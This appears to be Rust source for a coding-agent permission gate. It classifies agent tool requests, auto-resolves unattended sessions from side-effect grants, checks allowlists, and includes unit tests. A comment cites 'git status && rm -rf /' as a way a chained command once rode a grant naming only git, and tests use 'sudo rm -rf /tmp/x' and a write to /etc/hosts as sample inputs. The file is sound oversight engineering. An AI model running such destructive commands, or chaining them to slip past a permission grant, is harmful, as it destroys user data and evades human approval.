/// * A command request reuses the command guard's STATIC classification,
///   normalized onto its bash tool vocabulary. The deny-list, the allowlist and
///   the static fallback all apply, with no LLM judge. An in-workspace
///   destruction counts as benign here, because it is recoverable. An
///   irreversible side-effect carries its category for the grant check. A
///   shape the fast path REFUSED is [`RequestVerdict::Unclassified`], which
///   denies; a merely unrecognised head still runs.
/// * A file request is benign only when EVERY target is in-workspace. **Any**
///   target outside the workspace root makes the whole request out-of-workspace
///   destruction, which is grant-gated. A `file_change` whose targets are
///   unknown is grant-gated too: codex raises that approval because the patch
///   escaped its sandbox, so "I could not see the paths" is not permission.
/// * Anything else is benign.
pub fn classify_coding_agent_request(
    tool_name: &str,
    input: &serde_json::Value,
    workspace_path: &Path,
) -> RequestVerdict {
    match coding_agent_command(tool_name, input) {
        // A command we cannot read is the opposite of benign. The whole
        // classification below reads the command text, so there is nothing
        // left to decide on.
        CommandPayload::Unresolved => return RequestVerdict::Unclassified,
        CommandPayload::Known(cmd) => {
            // Codex wraps commands as `/bin/zsh -lc '<script>'`; classify the
            // inner script so a wrapped side-effect isn't hidden behind `zsh`.
            let synthetic = serde_json::json!({ "command": unwrap_shell_command(cmd) });
            return match command_guard::static_classify(tn::RUN_BASH, &synthetic) {
                StaticVerdict::Settled(RiskLane::Catastrophic) => RequestVerdict::Catastrophic,
                // `static_classify` only ever settles Safe/Catastrophic; map the
                // rest defensively to benign.
                StaticVerdict::Settled(_) => RequestVerdict::Benign,
                StaticVerdict::NeedsJudge(ji) => {
                    let judged = command_guard::fallback_classify(&ji);
                    match judged.lane {
                        RiskLane::Catastrophic => RequestVerdict::Catastrophic,
                        // Ahead of the category arm on purpose. The fast path
                        // refused this shape rather than just missing its
                        // head. A category the fallback derived from the same
                        // text is not something to check a grant against.
                        _ if ji.fast_path_refused => RequestVerdict::Unclassified,
                        RiskLane::IrreversibleDanger => RequestVerdict::SideEffect(
                            judged.category.unwrap_or(SideEffectCategory::Other),
                        ),
                        RiskLane::Safe | RiskLane::ReversibleDanger => RequestVerdict::Benign,
                    }
                }
            };
        }
        CommandPayload::NotACommand => {}
    }
    match coding_agent_file_targets(tool_name, input) {
        FileTargets::Known(targets) => {
            if targets
                .iter()
                .any(|path| path_outside_workspace(path, workspace_path))
            {
                return RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction);
            }
            return RequestVerdict::Benign;
        }
        // A file write we cannot place is the opposite of benign, so it is
        // grant-gated rather than waved through. Codex only asks about a patch
        // that already escaped its sandbox. Falling through to the benign
        // default below would auto-allow every out-of-workspace write in an
        // unattended session, since `grant_root` arrives `null`.
        FileTargets::Unresolved => {
            return RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction);
        }
        FileTargets::NotAFileWrite => {}
    }
    RequestVerdict::Benign
}

/// Whether this thread's session-allow set already covers the request.
///
/// A command tool takes the chat lane's rule through the one shared predicate,
/// [`command_guard::grant_covers_command`]: EVERY segment head must be
/// covered, and a code-injecting `VAR=value` preamble is refused outright.
/// Matching a single derived pattern instead let `git status && rm -rf /` ride
/// a grant naming only `git`. Every other tool matches its one derived pattern
/// exactly, as before.
fn session_allow_covers(
    tool_name: &str,
    input: &serde_json::Value,
    allowed: impl Fn(&str) -> bool,
) -> bool {
    use crate::engine::claude_code::{derive_allow_pattern, AllowScope};
    if matches!(tool_name, "Bash" | "command_execution") {
        let Some(command) = input.get("command").and_then(|v| v.as_str()) else {
            return false;
        };
        return command_guard::grant_covers_command(tool_name, command, allowed);
    }
    derive_allow_pattern(tool_name, input, AllowScope::Session).is_some_and(|p| allowed(&p))
}

/// Whether this workspace's persisted allowlist covers the request. Sibling of
/// [`session_allow_covers`], over `cc-allowed-tools` instead of the per-thread
/// set.
///
/// **The honour rule is [`derive_allow_pattern`] itself**: a stored pattern
/// covers a request only where that function would have PRODUCED it for this
/// same request, at `Broad` or `Narrow`. So the engine is never more permissive
/// than the respawned subprocess will be. `None` at both persisted scopes
/// records that CC ignores the pattern, and it rules out three cases:
///
///   * a bare `Edit` / `Write` / `NotebookEdit` / `ExitPlanMode` line;
///   * a `Bash` command touching `.claude/` or `.git/`;
///   * the Codex backend tools, whose driver never reads this file.
///
/// A command then takes the same per-segment rule as the session lane, through
/// [`command_guard::grant_covers_command`].
fn persisted_allow_covers(
    tool_name: &str,
    input: &serde_json::Value,
    allowed: impl Fn(&str) -> bool,
) -> bool {
    use crate::engine::claude_code::{derive_allow_pattern, AllowScope};
    if matches!(tool_name, "Bash" | "command_execution") {
        // `Broad` is `None` for exactly the two cases a stored pattern must not
        // reach here: a CC-protected path, and a Codex backend tool.
        if derive_allow_pattern(tool_name, input, AllowScope::Broad).is_none() {
            return false;
        }
        let Some(command) = input.get("command").and_then(|v| v.as_str()) else {
            return false;
        };
        return command_guard::grant_covers_command(tool_name, command, allowed);
    }
    [AllowScope::Broad, AllowScope::Narrow]
        .into_iter()
        .filter_map(|scope| derive_allow_pattern(tool_name, input, scope))
        .any(|pattern| allowed(&pattern))
}

/// Resolve a permission request for an unattended session from its classified
/// verdict and the inherited grant. Returns `(allowed, reason)`.
fn decide_unattended(verdict: RequestVerdict, grant: &[SideEffectCategory]) -> (bool, String) {
    match verdict {
        RequestVerdict::Benign => (true, UNATTENDED_ALLOW_BENIGN_REASON.to_string()),
        RequestVerdict::Catastrophic => (false, UNATTENDED_DENY_CATASTROPHIC_REASON.to_string()),
        RequestVerdict::Unclassified => (false, UNATTENDED_DENY_UNCLASSIFIED_REASON.to_string()),
        RequestVerdict::SideEffect(cat) => {
            if grant.contains(&cat) {
                (true, UNATTENDED_ALLOW_GRANTED_REASON.to_string())
            } else {
                (
                    false,
                    format!(
                        "Auto-denied: this coding-agent session runs unattended under a trigger \
                         that did not grant {} — add the matching category to the trigger's \
                         side-effect grant to allow it.",
                        cat.reason()
                    ),
                )
            }
        }
    }
}

/// The per-request payload a backend funnels into
/// [`prompt_coding_agent_permission`]: the call-specific data, kept distinct
/// from the engine-infra handles the chokepoint also needs.
pub struct CodingAgentPermissionInput {
    pub thread_id: Uuid,
    pub tool_use_id: String,
    pub tool_name: String,
    pub input: serde_json::Value,
}

/// Read the worktree root of `thread_id`'s live agent session, if any.
///
/// For the **out-of-process** raise path the registry is the only way in: the
/// request carries a thread id and a tool call, nothing about the worktree. The
/// **in-process** Codex bridge instead reads `run_session`'s own
/// `worktree_path` local, which is the value that seeded this registry entry.
/// Both paths see the same root, and the bridge takes no lock in the engine's
/// highest-traffic loop.
///
/// A `None` result makes [`worktree_write_auto_allowed`] fail closed.
pub async fn lookup_session_worktree(
    agent_sessions: &tokio::sync::Mutex<HashMap<Uuid, crate::engine::types::AgentSession>>,
    thread_id: Uuid,
) -> Option<std::path::PathBuf> {
    let sessions = agent_sessions.lock().await;
    sessions.get(&thread_id)?.worktree_path.clone()
}

/// One blocking permission round-trip: the shared core both raise paths drive,
/// CC's MCP HTTP path and the Codex app-server bridge. The flow is five gates,
/// in order:
///
///   1. **In-worktree write fast path.** A file write inside the session's own
///      worktree needs no card. Checked first because it is pure and DB-free.
///   2. **Session-allow pre-check.** An earlier "Allow for this thread" click
///      whose pattern matches skips the prompt, rehydrated from persisted
///      events so it survives an engine restart.
///   3. **Unattended fast path.** A trigger-rooted session has no human to
///      answer, so it resolves immediately: benign in-workspace work
///      auto-allows, an irreversible side-effect auto-allows only under a
///      matching trigger grant, everything else auto-denies. No card events,
///      so the session never hangs.
///   4. **Persisted-allow pre-check.** An earlier "Always allow" click whose
///      pattern is in this workspace's `cc-allowed-tools` skips the prompt.
///      Deliberately BELOW the unattended gate, so a workspace grant can never
///      override [`decide_unattended`].
///   5. **Interactive.** `register_or_attach` dedups, the canonical request
///      emits `CodingAgentPermissionRequest`, and the wait on the broadcast is
///      **indefinite**.
///
/// The paired `CodingAgentPermissionResolved` is emitted by the consent
/// endpoint, so it fires once per click rather than once per deduped listener.
pub async fn prompt_coding_agent_permission(
    pool: &sqlx::PgPool,
    event_bus: &EventBus,
    pending: &Mutex<PermissionState>,
    trigger_configs: &Arc<RwLock<HashMap<String, TriggerConfig>>>,
    workspace_path: &Path,
    worktree_path: Option<&Path>,
    request: CodingAgentPermissionInput,
) -> PermissionPromptOutcome {
    let CodingAgentPermissionInput {
        thread_id,
        tool_use_id,
        tool_name,
        input,
    } = request;

    // Cheapest gate first: a pure path check, no lock and no DB.
    if worktree_write_auto_allowed(&tool_name, &input, worktree_path) {
        return PermissionPromptOutcome {
            allowed: true,
            reason: Some(WORKTREE_WRITE_ALLOW_REASON.to_string()),
        };
    }

    // Rebuild this thread's grants from persisted events, once per engine
    // lifetime, so a restart between the click and the next matching request
    // does not re-ask.
    hydrate_session_allows(pool, pending, thread_id).await;

    let is_session_allowed = {
        let pending = pending.lock().unwrap();
        session_allow_covers(&tool_name, &input, |p| {
            pending.matches_session_allow(thread_id, p)
        })
    };
    if is_session_allowed {
        return PermissionPromptOutcome {
            allowed: true,
            reason: Some(SESSION_ALLOW_REASON.to_string()),
        };
    }

    // An unattended session has no human to answer a card, so resolve it from
    // the inherited side-effect grant plus a static benign check. The session
    // NEVER hangs, and nothing here waits. An auto-ALLOW emits no events, like
    // the fast path above: it surfaces as the normal tool call. An auto-DENY
    // records the pair (see `record_unattended_denial`), because the agent's
    // own failure report is not something the user can read back later.
    if let AttendMode::Unattended { grant } =
        resolve_attend_mode(pool, trigger_configs, thread_id).await
    {
        let verdict = classify_coding_agent_request(&tool_name, &input, workspace_path);
        let (allowed, reason) = decide_unattended(verdict, &grant);
        crate::log!(
            "[CCPermission] unattended auto-resolve thread={} tool={} -> {} ({})",
            thread_id,
            tool_name,
            if allowed { "allow" } else { "deny" },
            reason
        );
        if !allowed {
            record_unattended_denial(
                pool,
                event_bus,
                thread_id,
                &tool_use_id,
                &tool_name,
                &input,
                &reason,
            )
            .await;
        }
        return PermissionPromptOutcome {
            allowed,
            reason: Some(reason),
        };
    }

    // The workspace's own "Always allow" grants, read fresh so a click binds
    // THIS session rather than the next spawn: the file reaches Claude Code as
    // `--allowedTools`, which is frozen for the subprocess's life. Mirrors the
    // chat lane, which reads `agent-allowed-commands` on every prompt. Below
    // the unattended gate on purpose, so a grant a human clicked can never
    // decide a request nobody is watching.
    let granted = crate::core::grants::patterns(
        &crate::core::grants_dir(workspace_path),
        crate::core::grants::GrantFile::CodingAgentTools,
    );
    if persisted_allow_covers(&tool_name, &input, |p| granted.iter().any(|g| g == p)) {
        return PermissionPromptOutcome {
            allowed: true,
            reason: Some(PERSISTED_ALLOW_REASON.to_string()),
        };
    }

    let canonical_input = serde_json::to_string(&input).unwrap_or_else(|_| "{}".to_string());
    let dedup_key: DedupKey = (thread_id, tool_name.clone(), canonical_input);
    // The event below is persisted AND fanned out over SSE, and it carries the
    // tool input verbatim. A hardcoded connection URI in the command text would
    // reach the event store in the clear, so redact a COPY for the event. The
    // dedup key and the pending entry keep the verbatim input, which is what
    // the agent asked to run and what the approval must match. The summary is
    // built from the redacted copy, because it interpolates the command.
    let mut event_input = input.clone();
    crate::core::redact_postgres_secrets_in_json(&mut event_input);
    let summary = build_permission_summary(&tool_name, &event_input);

    let (request_id, mut rx, is_canonical) = {
        let mut pending = pending.lock().unwrap();
        pending.register_or_attach(dedup_key, thread_id, tool_name.clone(), input.clone())
    };

    if is_canonical {
        // Neither raise path carries a header-borne actor (an MCP subprocess
        // / a JSON-RPC request from the agent child). Recover the
        // originating actor from the thread's last user message.
        let actor = lookup_thread_actor(pool, thread_id).await;
        let meta = match actor {
            Some(a) => EventMeta::with_actor(Some(a)),
            None => EventMeta::NONE,
        };
        event_bus
            .emit_or_log(
                BusEvent::Thread {
                    thread_id,
                    event: ThreadEvent::CodingAgentPermissionRequest {
                        request_id: request_id.clone(),
                        tool_use_id,
                        tool_name,
                        input: event_input,
                        summary,
                    },
                    meta,
                },
                "[CCPermission] CodingAgentPermissionRequest",
            )
            .await;
    }

    // Wait forever for the user — the user is the rate-limiter. The decision is
    // factored into `outcome_from_permission_recv` so the three-way split is
    // unit-testable without a DB.
    outcome_from_permission_recv(rx.recv().await)
}

/// Record an unattended auto-DENY in the thread's timeline, as the ordinary
/// request/resolved pair rather than a new event type.
///
/// The unattended lane emits nothing on an ALLOW, deliberately: there is no
/// decision to show. A deny is different. The agent reports a failed step, and
/// without this the user cannot see what the engine refused or why, so the run
/// is undiagnosable. The two events are emitted back to back, so the card
/// renders already answered and the thread is never left needing attention.
///
/// The command text is redacted for the event exactly as the interactive path
/// redacts it: it is persisted AND fanned out over SSE.
async fn record_unattended_denial(
    pool: &sqlx::PgPool,
    event_bus: &EventBus,
    thread_id: Uuid,
    tool_use_id: &str,
    tool_name: &str,
    input: &serde_json::Value,
    reason: &str,
) {
    let request_id = Uuid::new_v4().to_string();
    let mut event_input = input.clone();
    crate::core::redact_postgres_secrets_in_json(&mut event_input);
    let summary = build_permission_summary(tool_name, &event_input);
    // No header-borne actor on either raise path, so recover the originating
    // actor from the thread's last user message, as the card path does.
    let meta = match lookup_thread_actor(pool, thread_id).await {
        Some(a) => EventMeta::with_actor(Some(a)),
        None => EventMeta::NONE,
    };
    event_bus
        .emit_or_log(
            BusEvent::Thread {
                thread_id,
                event: ThreadEvent::CodingAgentPermissionRequest {
                    request_id: request_id.clone(),
                    tool_use_id: tool_use_id.to_string(),
                    tool_name: tool_name.to_string(),
                    input: event_input,
                    summary,
                },
                meta: meta.clone(),
            },
            "[CCPermission] CodingAgentPermissionRequest (unattended deny)",
        )
        .await;
    event_bus
        .emit_or_log(
            BusEvent::Thread {
                thread_id,
                event: ThreadEvent::CodingAgentPermissionResolved {
                    request_id,
                    allowed: false,
                    reason: Some(reason.to_string()),
                    persist_scope: None,
                },
                meta,
            },
            "[CCPermission] CodingAgentPermissionResolved (unattended deny)",
        )
        .await;
}

/// Map the broadcast `recv` result for a pending permission into the outcome
/// relayed to the agent. The three outcomes are distinct:
///   * `Ok(true)` is an explicit Allow fanned over the broadcast.
///   * `Ok(false)` is an explicit Deny, supersession included.
///   * `Err(_)` means the channel CLOSED, which can only be the engine tearing
///     down. Every live resolution path sends before dropping the sender, and
///     `gc_dead_entries` never reaps an entry whose receiver is still awaiting.
///     A restart is NOT a user denial, so it carries the neutral
///     `RESTART_INTERRUPT_REASON`. Otherwise a resumed session reads "User
///     denied" and treats the restart as a rejection of its approach.
fn outcome_from_permission_recv(
    recv: Result<bool, tokio::sync::broadcast::error::RecvError>,
) -> PermissionPromptOutcome {
    match recv {
        Ok(true) => PermissionPromptOutcome {
            allowed: true,
            reason: None,
        },
        Ok(false) => PermissionPromptOutcome {
            allowed: false,
            reason: Some(DENIAL_REASON.to_string()),
        },
        Err(_) => PermissionPromptOutcome {
            allowed: false,
            reason: Some(RESTART_INTERRUPT_REASON.to_string()),
        },
    }
}

/// Resolve every unresolved `CodingAgentPermissionRequest` on `thread_id` as
/// denied — because the user typed a new message instead of clicking a button
/// on the permission card. Thin wrapper over
/// [`resolve_pending_permissions_with_reason`]; the caller still routes the
/// typed message to CC as a normal follow-up, this only clears the stale card.
pub async fn resolve_pending_permissions_as_superseded(
    pool: &sqlx::PgPool,
    event_bus: &EventBus,
    pending: &Mutex<PermissionState>,
    thread_id: Uuid,
    actor: Option<MessageOrigin>,
) {
    resolve_pending_permissions_with_reason(
        pool,
        event_bus,
        pending,
        thread_id,
        actor,
        SUPERSEDED_REASON,
        "[CCPermission] CodingAgentPermissionResolved (superseded)",
    )
    .await;
}

/// Resolve every unresolved `CodingAgentPermissionRequest` on `thread_id` as
/// denied, because the session IDLED with a card still dangling. Thin wrapper
/// over [`resolve_pending_permissions_with_reason`], called from
/// `emit_coding_agent_idled` at the turn boundary. The turn is done by then, so
/// a still-pending card is orphaned and clearing it is safe: a live card blocks
/// the turn, so idle cannot fire during a genuine wait.
pub async fn resolve_pending_permissions_as_session_ended(
    pool: &sqlx::PgPool,
    event_bus: &EventBus,
    pending: &Mutex<PermissionState>,
    thread_id: Uuid,
    actor: Option<MessageOrigin>,
) {
    resolve_pending_permissions_with_reason(
        pool,
        event_bus,
        pending,
        thread_id,
        actor,
        SESSION_ENDED_REASON,
        "[CCPermission] CodingAgentPermissionResolved (session ended)",
    )
    .await;
}

/// Shared core of the two sweeps that clear every unresolved
/// `CodingAgentPermissionRequest` on this thread as denied: the superseded path
/// and the session-ended path. Mirrors `recover_orphan_cc_permission_requests`
/// but scoped to one thread. Two effects per unresolved request:
///
///   1. Fan a deny out to any still-blocked handler through the in-memory
///      broadcast entry. The subprocess's pending call then returns
///      immediately, rather than dangling until the next sweep.
///   2. Emit a denied `CodingAgentPermissionResolved`, so the card's buttons
///      stop dangling. Without it the card sits clickable forever and the
///      thread reads as stuck.
///
/// A resolution flips the thread to `running` ONLY from
/// `waiting_for_user_answer`, so emitting these on an already-idle thread
/// clears the stale card WITHOUT resurrecting it. `reason` and `log_label`
/// distinguish the two callers. No-op when nothing is pending.
async fn resolve_pending_permissions_with_reason(
    pool: &sqlx::PgPool,
    event_bus: &EventBus,
    pending: &Mutex<PermissionState>,
    thread_id: Uuid,
    actor: Option<MessageOrigin>,
    reason: &str,
    log_label: &str,
) {
    let rows: Vec<(Option<String>,)> = match sqlx::query_as(
        "SELECT e.payload->>'request_id' \
         FROM events e \
         WHERE e.event_type = 'CodingAgentPermissionRequest' \
           AND e.thread_id = $1 \
           AND NOT EXISTS ( \
             SELECT 1 FROM events r \
             WHERE r.event_type = 'CodingAgentPermissionResolved' \
               AND r.payload->>'request_id' = e.payload->>'request_id' \
           )",
    )
    .bind(thread_id)
    .fetch_all(pool)
    .await
    {
        Ok(r) => r,
        Err(e) => {
            crate::log!(
                "[CCPermission] unresolved-permission query failed for {}: {}",
                thread_id,
                e
            );
            return;
        }
    };

    for (request_id,) in rows {
        let Some(request_id) = request_id.filter(|s| !s.is_empty()) else {
            continue;
        };
        // Best-effort unblock of a still-waiting MCP handler. The std Mutex is
        // released before the `.await` below — never hold it across an await.
        {
            let mut state = pending.lock().unwrap();
            if let Some(entry) = state.take(&request_id) {
                let _ = entry.tx.send(false);
            }
        }
        event_bus
            .emit_or_log(
                BusEvent::Thread {
                    thread_id,
                    event: ThreadEvent::CodingAgentPermissionResolved {
                        request_id,
                        allowed: false,
                        reason: Some(reason.to_string()),
                        persist_scope: None,
                    },
                    meta: EventMeta::with_actor(actor.clone()),
                },
                log_label,
            )
            .await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn build_permission_summary_uses_file_path() {
        let s = build_permission_summary(
            "Edit",
            &serde_json::json!({ "file_path": "/tmp/foo.md", "old_string": "x" }),
        );
        assert_eq!(s, "Edit /tmp/foo.md");
    }

    #[test]
    fn build_permission_summary_falls_back_to_command() {
        let s = build_permission_summary("Bash", &serde_json::json!({ "command": "ls -la" }));
        assert_eq!(s, "Bash ls -la");
        // The Codex app-server bridge raises command approvals under the
        // backend's own tool vocabulary — the summary must surface the
        // command the same way.
        let s = build_permission_summary(
            "command_execution",
            &serde_json::json!({ "command": "sudo rm -rf /tmp/x", "cwd": "/wt" }),
        );
        assert_eq!(s, "command_execution sudo rm -rf /tmp/x");
    }

    #[test]
    fn build_permission_summary_returns_tool_name_when_no_arg_field() {
        let s = build_permission_summary("WeirdTool", &serde_json::json!({ "foo": 1 }));
        assert_eq!(s, "WeirdTool");
    }

    #[test]
    fn build_permission_summary_uses_skill_for_skill_tool() {
        let s = build_permission_summary("Skill", &serde_json::json!({ "skill": "update-config" }));
        assert_eq!(s, "skill update-config");
    }

    #[test]
    fn build_permission_summary_names_the_codex_changed_files() {
        // The whole complaint: this card used to read as a bare "file_change".
        let one = build_permission_summary(
            "file_change",
            &serde_json::json!({
                "item_id": "exec-1",
                "changes": [{"path": "/Users/me/notes.txt", "kind": {"type": "add"}}],
            }),
        );
        assert_eq!(one, "file_change /Users/me/notes.txt");

        let three = build_permission_summary(
            "file_change",
            &serde_json::json!({"changes": [
                {"path": "/a.rs"}, {"path": "/b.rs"}, {"path": "/c.rs"},
            ]}),
        );
        assert_eq!(three, "file_change /a.rs, /b.rs, /c.rs");

        let many = build_permission_summary(
            "file_change",
            &serde_json::json!({"changes": [
                {"path": "/a.rs"}, {"path": "/b.rs"}, {"path": "/c.rs"},
                {"path": "/d.rs"}, {"path": "/e.rs"},
            ]}),
        );
        assert_eq!(many, "file_change /a.rs, /b.rs, /c.rs +2 more");
    }

    #[test]
    fn build_permission_summary_prefers_paths_over_the_codex_reason() {
        // `reason` was only ever a last resort for the pathless card; now that
        // the driver attaches the `changes` list, the files win.
        let s = build_permission_summary(
            "file_change",
            &serde_json::json!({
                "reason": "writes outside worktree",
                "grant_root": "/etc",
                "changes": [{"path": "/etc/hosts", "kind": {"type": "update"}}],
            }),
        );
        assert_eq!(s, "file_change /etc/hosts");
    }

    #[test]
    fn build_permission_summary_falls_back_when_the_change_set_is_unknown() {
        // Degrade path: a reordered or dropped `item/started` costs the card
        // its detail, nothing more.
        let s = build_permission_summary(
            "file_change",
            &serde_json::json!({"item_id": "exec-1", "reason": "needs write access"}),
        );
        assert_eq!(s, "file_change needs write access");
        let bare = build_permission_summary("file_change", &serde_json::json!({"changes": []}));
        assert_eq!(bare, "file_change");
    }

    #[test]
    fn build_permission_summary_uses_url_for_webfetch() {
        let s = build_permission_summary(
            "WebFetch",
            &serde_json::json!({ "url": "https://example.com", "prompt": "x" }),
        );
        assert_eq!(s, "WebFetch https://example.com");
    }

    #[test]
    fn outcome_allow_has_no_reason() {
        let o = outcome_from_permission_recv(Ok(true));
        assert!(o.allowed);
        assert_eq!(o.reason, None);
    }

    #[test]
    fn outcome_explicit_deny_is_user_denied() {
        // A `false` fanned over the broadcast (explicit Deny click or
        // supersession) keeps the "User denied" reason.
        let o = outcome_from_permission_recv(Ok(false));
        assert!(!o.allowed);
        assert_eq!(o.reason.as_deref(), Some(DENIAL_REASON));
    }

    #[test]
    fn outcome_closed_channel_is_restart_not_user_denied() {
        // A closed channel means the engine tore down (restart). It must NOT
        // surface as "User denied" — a resumed session would read that as the
        // user rejecting its approach.
        use tokio::sync::broadcast::error::RecvError;
        let o = outcome_from_permission_recv(Err(RecvError::Closed));
        assert!(!o.allowed);
        assert_eq!(o.reason.as_deref(), Some(RESTART_INTERRUPT_REASON));
        assert_ne!(o.reason.as_deref(), Some(DENIAL_REASON));
    }

    fn register(
        state: &mut PermissionState,
        key: DedupKey,
    ) -> (String, tokio::sync::broadcast::Receiver<bool>, bool) {
        let tool_name = key.1.clone();
        state.register_or_attach(key, Uuid::nil(), tool_name, serde_json::json!({}))
    }

    #[test]
    fn register_or_attach_creates_canonical_entry_first_time() {
        let mut state = PermissionState::default();
        let key: DedupKey = (Uuid::nil(), "Edit".into(), "{}".into());
        let (request_id, _rx, is_canonical) = register(&mut state, key.clone());
        assert!(is_canonical, "first request must be canonical");
        assert!(state.by_dedup_key.contains_key(&key));
        assert!(state.by_request_id.contains_key(&request_id));
    }

    #[test]
    fn register_or_attach_returns_existing_request_id_for_duplicate() {
        let mut state = PermissionState::default();
        let key: DedupKey = (Uuid::nil(), "Edit".into(), "{}".into());
        let (first_id, _rx1, first_canonical) = register(&mut state, key.clone());
        let (second_id, _rx2, second_canonical) = register(&mut state, key.clone());
        assert!(first_canonical);
        assert!(!second_canonical, "duplicate must not be canonical");
        assert_eq!(
            first_id, second_id,
            "duplicate must reuse the canonical request_id"
        );
    }

    #[test]
    fn register_or_attach_stores_tool_name_and_input_on_canonical_entry() {
        let mut state = PermissionState::default();
        let key: DedupKey = (Uuid::nil(), "Skill".into(), "{\"skill\":\"x:y\"}".into());
        let (request_id, _rx, _) = state.register_or_attach(
            key,
            Uuid::nil(),
            "Skill".into(),
            serde_json::json!({"skill": "x:y"}),
        );
        let entry = state.take(&request_id).unwrap();
        assert_eq!(entry.tool_name, "Skill");
        assert_eq!(entry.input, serde_json::json!({"skill": "x:y"}));
    }

    #[tokio::test]
    async fn duplicate_subscribers_both_receive_the_answer() {
        let mut state = PermissionState::default();
        let key: DedupKey = (Uuid::nil(), "Edit".into(), "{}".into());
        let (id, mut rx1, _) = register(&mut state, key.clone());
        let (_, mut rx2, _) = register(&mut state, key.clone());

        // Resolve via the same path the consent endpoint uses.
        let entry = state.take(&id).expect("entry must be present");
        let _ = entry.tx.send(true);

        assert!(rx1.recv().await.unwrap());
        assert!(rx2.recv().await.unwrap());
    }

    fn entry(req_id: &str) -> PermissionEntry {
        let (tx, _rx) = tokio::sync::broadcast::channel(1);
        PermissionEntry {
            thread_id: Uuid::nil(),
            request_id: req_id.to_string(),
            tool_name: "Edit".to_string(),
            input: serde_json::json!({}),
            tx,
        }
    }

    #[test]
    fn take_returns_none_for_unknown_request_id() {
        let mut state = PermissionState::default();
        assert!(state.take("missing").is_none());
    }

    #[test]
    fn take_removes_from_both_indexes() {
        let mut state = PermissionState::default();
        let key: DedupKey = (Uuid::nil(), "Edit".to_string(), "{}".to_string());
        state.by_dedup_key.insert(key.clone(), entry("req-1"));
        state.by_request_id.insert("req-1".to_string(), key.clone());

        let taken = state.take("req-1").expect("entry must be returned");
        assert_eq!(taken.request_id, "req-1");
        assert!(state.by_dedup_key.is_empty());
        assert!(state.by_request_id.is_empty());
    }

    #[test]
    fn allow_session_inserts_and_matches_per_thread() {
        let mut state = PermissionState::default();
        let thread_a = Uuid::new_v4();
        let thread_b = Uuid::new_v4();
        state.allow_session(thread_a, "Edit(/tmp/foo.md)".into());
        assert!(state.matches_session_allow(thread_a, "Edit(/tmp/foo.md)"));
        // Different thread does NOT inherit the allow.
        assert!(!state.matches_session_allow(thread_b, "Edit(/tmp/foo.md)"));
        // Different pattern in the same thread does NOT match.
        assert!(!state.matches_session_allow(thread_a, "Edit(/tmp/bar.md)"));
    }

    #[test]
    fn allow_session_is_idempotent() {
        let mut state = PermissionState::default();
        let thread = Uuid::new_v4();
        state.allow_session(thread, "Bash(git:*)".into());
        state.allow_session(thread, "Bash(git:*)".into());
        assert_eq!(
            state.session_allows.get(&thread).map(|s| s.len()),
            Some(1),
            "duplicate insert must not grow the set"
        );
    }

    /// Seed the thread as a coding-agent thread. The lifecycle guard rejects
    /// `CodingAgentPermissionRequest` on a thread it classifies as Chat, which
    /// is what an unseeded test thread looks like.
    async fn seed_cc_thread(bus: &crate::engine::event_bus::EventBus, thread_id: Uuid) {
        bus.emit(BusEvent::Thread {
            thread_id,
            event: ThreadEvent::SessionStarted {
                coding_agent: crate::runtime::CodingAgent::Codex,
                session_id: "sid-test".into(),
                branch: "claude-code/test".into(),
                repo_id: None,
                coding_agent_kind: Default::default(),
                coding_agent_folder: String::new(),
                app_id: None,
            },
            meta: EventMeta {
                channel: Some(crate::engine::thread_events::EventChannel::ClaudeCode),
                ..EventMeta::NONE
            },
        })
        .await
        .expect("SessionStarted emit")
        .expect("SessionStarted persisted");
    }

    fn empty_trigger_configs() -> Arc<RwLock<HashMap<String, TriggerConfig>>> {
        Arc::new(RwLock::new(HashMap::new()))
    }

    /// Build a one-entry trigger registry whose trigger carries `grant`.
    fn trigger_configs_with(
        trigger_id: &str,
        grant: Vec<SideEffectCategory>,
    ) -> Arc<RwLock<HashMap<String, TriggerConfig>>> {
        let payload = serde_json::json!({
            "trigger_id": trigger_id,
            "name": "Test Trigger",
            "schedule": ["0 0 3 * * *"],
            "timezone": "UTC",
            "run": { "type": "intent", "intent": "do nightly work" },
            "side_effect_grant": serde_json::to_value(&grant).unwrap(),
        });
        let config = TriggerConfig::from_created_payload(&payload).expect("build TriggerConfig");
        let mut map = HashMap::new();
        map.insert(trigger_id.to_string(), config);
        Arc::new(RwLock::new(map))
    }

    /// Insert a raw event row carrying an origin, so the resolver's query has
    /// something to read. Cheaper than driving a full `MessageReceived` through
    /// the bus and the lifecycle guard.
    ///
    /// Origin only, no `parent_thread_id`: that is the shape of a thread with
    /// no callback linkage.
    /// A child spawn carries both, so it uses [`insert_child_spawn_event`].
    async fn insert_origin_event(
        pool: &sqlx::PgPool,
        thread_id: Uuid,
        event_type: &str,
        origin: &MessageOrigin,
    ) {
        let payload = serde_json::json!({ "origin": origin });
        sqlx::query(
            "INSERT INTO events (id, aggregate, aggregate_id, event_type, payload, created, thread_id) \
             VALUES ($1, 'thread', $2, $3, $4, NOW(), $2::uuid)",
        )
        .bind(Uuid::new_v4())
        .bind(thread_id.to_string())
        .bind(event_type)
        .bind(payload)
        .execute(pool)
        .await
        .expect("insert origin event");
    }

    /// A `relation: "child"` spawn's `MessageReceived`: the `ThreadLink` origin
    /// AND the `parent_thread_id` callback linkage, exactly as
    /// `make_message_received` writes it. The linkage is what licenses the
    /// resolver's hop, so a fixture that omitted it would silently stop testing
    /// the walk.
    async fn insert_child_spawn_event(pool: &sqlx::PgPool, thread_id: Uuid, parent: Uuid) {
        let payload = serde_json::json!({
            "origin": parent_link(parent),
            "parent_thread_id": parent,
        });
        sqlx::query(
            "INSERT INTO events (id, aggregate, aggregate_id, event_type, payload, created, thread_id) \
             VALUES ($1, 'thread', $2, 'MessageReceived', $3, NOW(), $2::uuid)",
        )
        .bind(Uuid::new_v4())
        .bind(thread_id.to_string())
        .bind(payload)
        .execute(pool)
        .await
        .expect("insert child spawn event");
    }

    fn parent_link(parent: Uuid) -> MessageOrigin {
        MessageOrigin::ThreadLink {
            thread_id: parent,
            title: None,
            spawning_event_id: None,
            mode: ActorMode::Agent,
            direction: ThreadDirection::Parent,
        }
    }

    fn scheduler_origin(trigger_id: &str) -> MessageOrigin {
        MessageOrigin::engine(EngineReason::Scheduler {
            trigger_id: trigger_id.to_string(),
            trigger_name: None,
        })
    }

    // --- classifier (pure, no DB) ------------------------------------------

    #[test]
    fn classify_benign_in_workspace_command_allows() {
        // `lucidos data write` is not a recognized side-effect / destruction
